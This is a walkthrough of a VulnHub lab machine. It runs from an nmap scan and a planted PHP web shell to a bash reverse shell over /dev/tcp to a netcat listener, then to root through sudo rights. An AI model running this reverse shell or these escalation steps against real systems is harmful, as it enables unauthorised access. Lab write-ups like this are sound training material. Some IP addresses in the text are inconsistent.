**Escalate My Privileges: 1** is a challenge posted on [VulnHub](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/) created by [Akanksha Sachin Verma](https://www.vulnhub.com/author/akanksha-sachin-verma,672/). This is a write-up of my experience solving this awesome CTF challenge.

With my Attack Machine (**Kali Linux**) and Victim Machine (**Escalate My Privileges: 1**) set up and running, I decided to get down to solving this challenge.

I decided to start my journey by noting down the IP address of our victim machine. We are lucky that the author decided to display it directly on the login screen of the CentOS server.

Great! The victim machine has the IP address `192.168.56.120`. Let's continue with some port scanning (as usual üòè).

I decided to use my trusty `nmap`¬†with options enabled to scan¬†_all_ ports and provide details about the service running using the command:¬†`nmap -p- -sV 192.168.56.120`

![Screen Shot 2020-04-13 at 7.11.20 PM](/assets/images/screen-shot-2020-04-13-at-7.11.20-pm.png)

The `nmap` scan revealed a whole bunch of open ports on the victim machine. Now, the first thing that I noticed was port `80` and I decided to navigate to the website (`http://192.168.56.102`)¬†using **Firefox ESR** as follows:

Cool! A pretty `index.html` webpage which goes well with the theme of the challenge üòé

Whenever, I am faced with a `HTML` page, I make it a point to view the webpage source code **before** attempting brute-force using tools like `dirb` or `dirbuster`. I decided to hit `<CTRL+U>` to view the webpage source.

![Screen Shot 2020-04-13 at 7.21.20 PM](/assets/images/screen-shot-2020-04-13-at-7.21.20-pm-e1586791364696.png)

Interesting! The `alt` attribute in the `img` tag has a URL - `http://ip/phpbash.php`

I decided to check out `http://192.168.56.120/phpbash.php` by replacing `ip` with the victim machine's IP address.

Oh my God - command execution üò≥

I decided to play with some basic Linux commands to learn more about my privileges.

![Screen Shot 2020-04-13 at 7.54.41 PM](/assets/images/screen-shot-2020-04-13-at-7.54.41-pm.png)

Looks like I am `apache`.

I decided to check for more users on the victim machine and look for clues. For this purpose, I ran the command: `cd /home` to navigate to the `/home` directory where I can find other users (if any).

![Screen Shot 2020-04-13 at 8.00.37 PM](/assets/images/screen-shot-2020-04-13-at-8.00.37-pm.png)

Bingo! Looks like there is a user called `armour` on the victim machine. I decided to look inside using the command: `ls -lsa armour` to also display hidden files (if any).

![Screen Shot 2020-04-13 at 8.02.28 PM](/assets/images/screen-shot-2020-04-13-at-8.02.28-pm.png)

C'mon it is literally right there - `Credentials.txt`

What does it contain? I decided to find out...

![Screen Shot 2020-04-13 at 8.07.02 PM](/assets/images/screen-shot-2020-04-13-at-8.07.02-pm.png)

The `Credentials.txt` file contains the following text:

```
my password is
md5(rootroot1)
```

Woohoo! A password... but how to use it?

Maybe `SSH`? Our previous `nmap` scan did show that port `22` was open. Also, the website did not have a login portal or something similar. I decided to try the `SSH` approach.

But first - I decided to compute the `MD5` hash of the password string - `rootroot1` using the simple Linux command: `echo -n rootroot1 | md5sum`

![Screen Shot 2020-04-13 at 8.22.25 PM](/assets/images/screen-shot-2020-04-13-at-8.22.25-pm.png)

> The `-n` option for the `echo` command prevents output of the trailing newline

Great! We have our password!

I decided to try logging into the victim machine as `armour` using the command: 
`ssh armour@192.168.56.120`

![Screen Shot 2020-04-13 at 8.29.01 PM](/assets/images/screen-shot-2020-04-13-at-8.29.01-pm.png)

Damn! Not what I had expected!

I decided to go back to the webpage. Maybe I can login to the `armour` account directly using the `su` Linux command as follows: `su - armour`

![Screen Shot 2020-04-13 at 8.47.58 PM](/assets/images/screen-shot-2020-04-13-at-8.47.58-pm.png)

> Read more about `su` vs `sudo` [here](https://www.lifewire.com/switch-user-su-command-3887179)

Hmm, `Authentication failure`.

I decided to explore a different approach - Reverse Shell. Maybe an¬†_interactive_ shell will allow me to input the `MD5` password hash and escalate my privileges from `apache` to beyond üòé

With my handy [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) by **pentestmonkey**, I decided to proceed by launching `nc -lvp 1010` on my attack machine to listen for connections. Then, on the webpage command execution input, I ran the command:

`bash -i >& /dev/tcp/192.168.56.119/1010 0>&1` where `192.168.56.120` is the IP address of attack machine and port `1010` is the randomly selected port on which `nc` is listening on for connections.

![Screen Shot 2020-04-13 at 8.55.43 PM](/assets/images/screen-shot-2020-04-13-at-8.55.43-pm.png)

Lo and behold!

![Screen Shot 2020-04-13 at 9.12.38 PM](/assets/images/screen-shot-2020-04-13-at-9.12.38-pm.png)

Still `apache` btw!

Now, to login as `armour` using the command: `su - armour`

![Screen Shot 2020-04-13 at 10.20.24 PM](/assets/images/screen-shot-2020-04-13-at-10.20.24-pm.png)

Woohoo! I am `armour`

It is important to note that once the password is entered, there is no manual prompt. You just need to type in any command and see üòè

Okay, the next step is to escalate my privileges and capture the flag. But how?

I decided to proceed by checking for `sudo` rights for the user `armour`. To do this, I ran the command: `sudo -l`

![Screen Shot 2020-04-13 at 10.25.44 PM](/assets/images/screen-shot-2020-04-13-at-10.25.44-pm.png)

Bah! Enough is enough! It is time to get a¬†_full_ `tty` shell.

I ran my usual ever-wonderful Python `tty` command: `python -c 'import pty; pty.spawn("/bin/bash");'`

![Screen Shot 2020-04-13 at 10.28.18 PM](/assets/images/screen-shot-2020-04-13-at-10.28.18-pm.png)

That's when I decided to check the version of Python. After all, Python can't betray me üò≥

![Screen Shot 2020-04-13 at 10.29.48 PM](/assets/images/screen-shot-2020-04-13-at-10.29.48-pm.png)

Oh look what we have here!

Python 3.6 - Hurrah!

I decided to try the same Python `tty` command using `python3` this time as follows: `python3 -c 'import pty; pty.spawn("/bin/bash");'`

![Screen Shot 2020-04-13 at 10.31.22 PM](/assets/images/screen-shot-2020-04-13-at-10.31.22-pm-e1586802718207.png)

Well, there you go! Finally!

Back to checking for a chance to exploit `sudo` rights using the command: `sudo -l`

![Screen Shot 2020-04-13 at 10.33.32 PM](/assets/images/screen-shot-2020-04-13-at-10.33.32-pm.png)

Like a kid in a candy store. Woah!

How about using good ol' `bash`?

![Screen Shot 2020-04-13 at 10.36.18 PM](/assets/images/screen-shot-2020-04-13-at-10.36.18-pm.png)

We did it! We got root! Heck yes!

...Now for the flag üòé

![Screen Shot 2020-04-13 at 10.38.30 PM](/assets/images/screen-shot-2020-04-13-at-10.38.30-pm.png)

Is that `MD5`? üòè

#### My Thoughts

That was a great challenge from [Akanksha Sachin Verma](https://www.vulnhub.com/author/akanksha-sachin-verma,672/)! I really enjoyed going back to the basics. **Privilege escalation** is one of those areas where practice is everything and this challenge seems to be straightforward enough for a beginner (with boatloads of trial-and-error of course üòÅ)

I am writing a Vulnhub walkthrough after almost 7 months and had to do a LOT of Google-fu and re-read my old material to complete this challenge.

I look forward to solving more challenges in the [Escalate My Privileges](https://www.vulnhub.com/series/escalate-my-privileges,291/) series.
